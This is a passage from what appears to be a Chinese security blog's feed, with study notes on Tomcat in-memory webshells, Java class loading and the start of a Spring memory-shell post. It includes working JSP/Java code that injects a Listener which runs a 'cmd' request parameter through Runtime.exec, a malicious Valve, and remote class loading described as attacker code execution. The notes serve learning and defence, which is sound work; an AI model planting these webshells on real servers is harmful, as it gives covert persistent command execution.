&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Class&lt;? extends HttpServletRequest&gt; aClass = request.getClass();</span><br><span class="line">    Field declaredField = aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req=(Request) declaredField.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    String name=servlet.getClass().getSimpleName();</span><br><span class="line">    Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servlet);</span><br><span class="line">    wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servlet&quot;</span>,name);</span><br></pre></td></tr></table></figure>

<p>访问对应的jsp让其完成动态注入,接着就可以在对应路径执行命令了</p>
<h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>在Tomcat中,自定义了很多继承于EventListener接口的对象,应用于各个对象的监听</p>
<p>在继承了这个接口的对象中,有一个ServletRequestListener,它用于监听ServletRequest的生成和销毁,也就是说,只要访问该网站资源,就会触发requestInitialized方法</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140012800.png" alt="image-20220420140012800" style="zoom: 50%;" />

<p>在<code>StandardContext#fireRequestInitEvent</code>方法中,进行了对listener中初始化方法的调用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220420140848773.png" alt="image-20220420140848773"></p>
<p>综上所述,只需要创建一个<code>ServletRequestListener</code>并且将其添加到<code>StandardContext</code>中的<code>ApplicationEventListeners</code>就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ServletRequestListener servletRequestListener = <span class="keyword">new</span> ServletRequestListener()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                result.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            result.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + result.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Request request1 = (Request)declaredField.get(request);</span><br><span class="line">StandardContext standardContext=(StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br></pre></td></tr></table></figure>



<h2 id="Valve-阀门-内存马"><a href="#Valve-阀门-内存马" class="headerlink" title="Valve(阀门)内存马"></a>Valve(阀门)内存马</h2><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">tomcat管道与阀门原理讲解</a></p>
<p>Tomcat在处理一个请求调用逻辑的时候,传递Request和Response对象使用了职责链模式</p>
<p>Tomcat定义了两个接口Pipeline(管道)和Valve(阀门)</p>
<p>Pipeline接口的实现类是<code>StandardPipeline</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172150621.png" alt="image-20220423172150621"></p>
<p>Valve一般直接使用其实现类ValveBase</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172202365.png" alt="image-20220423172202365"></p>
<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 基础Valve之前，并按照添加顺序执行。</p>
<p>首先要了解的是每一种<code>container</code>都有一个自己的<code>StandardValve</code>(也就是基础Value)</p>
<ul>
<li><p>StandardEngineValve</p>
</li>
<li><p>StandardHostValve</p>
</li>
<li><p>StandardContextValve</p>
</li>
<li><p>StandardWrapperValve</p>
</li>
</ul>
<p>这些<code>Valve</code>会将接收到的数据扔给下一个<code>Container</code>的<code>Pipeline</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172536815.png" alt="image-20220423172536815"></p>
<p>Pipeline就像一个工厂中的生产线，负责调配工人（valve）的位置，valve则是生产线上负责不同操作的工人。<br>一个生产线的完成需要两步：<br>1，把原料运到工人边上<br>2，工人完成自己负责的部分</p>
<p>而tomcat的Pipeline实现是这样的：<br>1，在生产线上的第一个工人拿到生产原料后，二话不说就扔给下一个工人，下一个工人模仿第一个工人那样扔给下一个工人，直到最后一个工人，而最后一个工人被安排为上面提过的StandardValve，他要完成的工作居然是把生产资料运给自己包含的container的Pipeline上去。<br>2，四个container就相当于有四个生产线（Pipeline），四个Pipeline都这么干，直到最后的StandardWrapperValve拿到资源开始调用servlet。完成后返回来，一步一步的valve按照刚才丢生产原料是的顺序的倒序一次执行。如此才完成了tomcat的Pipeline的机制。</p>
<p>代码调用的地方</p>
<p>Adapter连接了Tomcat连接器<code>Connector</code>和容器<code>Container</code>它的实现类是<code>CoyoteAdapter</code>主要负责的是对请求进行封装,构造Request和Response对象.并将请求转发给Container也就是Servlet容器.</p>
<p>在<code>CoyoteAdapter</code>的<code>service</code>方法中调用了valve的invoke方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173023450.png" alt="image-20220423173023450"></p>
<p>这里调用的是StandardEngineValve的invoke方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173256592.png" alt="image-20220423173256592"></p>
<p>它在最后调用了Host容器的第一个Valve的invoke方法,如此像一条链一样走到之前写恶意valve的地方</p>
<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>在获取pipeline的时候有个小坑,我看见StandardContext在调试的时候有pipeline属性就以为它里面有这个属性,但是其实是在他继承的ContainerBase类里面呢</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171315008.png" alt="image-20220423171315008"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171440443.png" alt="image-20220423171440443"></p>
<p>同时代码稍作修改,也可以往host或者wrapper中添加恶意Valve</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先获取context,往context的管道中添加恶意Valve</span></span><br><span class="line"></span><br><span class="line">    Field requestField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Request request1 =(Request) requestField.get(request);</span><br><span class="line">    StandardContext context =(StandardContext) request1.getContext();</span><br><span class="line">    <span class="comment">//    StandardHost standardHost = (StandardHost) request1.getHost();</span></span><br><span class="line">    <span class="comment">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span></span><br><span class="line">    Field pipelineField = ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardPipeline standardPipeline= (StandardPipeline) pipelineField.get(context);</span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline2 = (StandardPipeline) pipelineField.get(standardHost);</span></span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline3 = (StandardPipeline) pipelineField.get(standardWrapper);</span></span><br><span class="line"></span><br><span class="line">    ValveBase valveBase = <span class="keyword">new</span> ValveBase()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardPipeline.addValve(valveBase);</span><br><span class="line">    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考引用</p>
<p><a href="https://blog.csdn.net/Xxy605/article/details/124120724">https://blog.csdn.net/Xxy605/article/details/124120724</a></p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>花了不少时间看大佬的文章,才算将整个流程调试着跟下来并有了浅显的理解,如果不看大佬的分析,估计连有点地方入口在哪都找不到</p>
<p>期间也感受到了基础知识对于看代码是有多么重要,就getClass这一点过去总是误解为它获取的都是当前类的class,还有就是英语也很重要,有时候点进去看个源码的注释,还是得靠英语</p>
<p>加油吧!</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>memshell</tag>
        <tag>filter</tag>
      </tags>
  </entry>
  <entry>
    <title>java类加载</title>
    <url>/2022/03/23/java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><span id="more"></span>

<p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。</p>
<p> 甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行：</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220323213706173.png" alt="image-20220323213706173"></p>
<p>通常所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加 载的字节序列</p>
<h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><p><code>URLClassLoader </code>实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p>
<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况： </p>
<ul>
<li><p>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </p>
</li>
<li><p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </p>
</li>
<li><p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 </p>
</li>
</ul>
<p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。</p>
<p>使用python搭建一个简易Http服务器,将class文件放在服务器上面,尝试加载</p>
<p><code>python3 -m http.server 5555</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        URLClassLoader urlClassLoader=<span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://xxxxxxxxxxx:5555/&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; test = urlClassLoader.loadClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以，作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>其实,不管是远程加载class文件还是本地的class或者Jar文件,经历的欧式下面这三个方法的调用</p>
<p><code>loadClass</code>—&gt;<code>findClass</code>—&gt;<code>defineClass</code></p>
<ul>
<li><p>其中： loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 </p>
</li>
<li><p>findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </p>
</li>
<li><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p>
</li>
</ul>
<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个native方法，逻辑在JVM的C语言代码中。\</p>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。</p>
<p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
<h5 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String TestName=<span class="string">&quot;demo1.HelloWorld&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(TestName))</span><br><span class="line">            <span class="keyword">return</span> defineClass(TestName,testClassBytes,<span class="number">0</span>,testClassBytes.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TestClassLoader loader=<span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        Class&lt;?&gt; testClass = loader.loadClass(TestName);</span><br><span class="line">        <span class="comment">//虽然在自定义classLoader中加载的是testClassBytes中的数据,但是在这里获取到Class后,在newInstance的时候用的是当前包下面对应的java文件中的class</span></span><br><span class="line">        Object newInstance = testClass.newInstance();</span><br><span class="line">        Method hello = newInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        String str=(String)hello.invoke(newInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>字节数组中存的数据对应的类代码:</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423154839887.png" alt="image-20220423154839887"></p>
<p>当前对应包名下面真正的类代码</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423154723513.png" alt="image-20220423154723513"></p>
<p>newInstance出来对应的是后者,变量名也都存在,这里存在被修改的可能</p>
<p>同时加载的两个类是否相等,不仅仅由类的路径来决定,还需要是同一个类加载器加载的才能被判断为相等</p>
<p>比如有两个ClassLoader A和B</p>
<p><code>ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</code>。</p>
<h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p>
<p>我们可以通过BCEL提供的两个类<code> Repository</code> 和<code>Utility</code>来利用： <code>Repository </code>用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：</p>
<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的<code> TemplatesImpl</code> 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了.</p>
<p>待续…..</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>spring内存马学习</title>
    <url>/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Controller内存马"><a href="#Controller内存马" class="headerlink" title="Controller内存马"></a>Controller内存马</h2><p>要学习内存马先得配好环境,之前学的创建springMVC项目的步骤已经忘完了…..,再复习一下</p>
<p>首先从maven目标中创建一个webapp项目</p>
<p>然后开始导入相关依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring核心--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.9.RELEASE<span class="tag">&lt;/<span 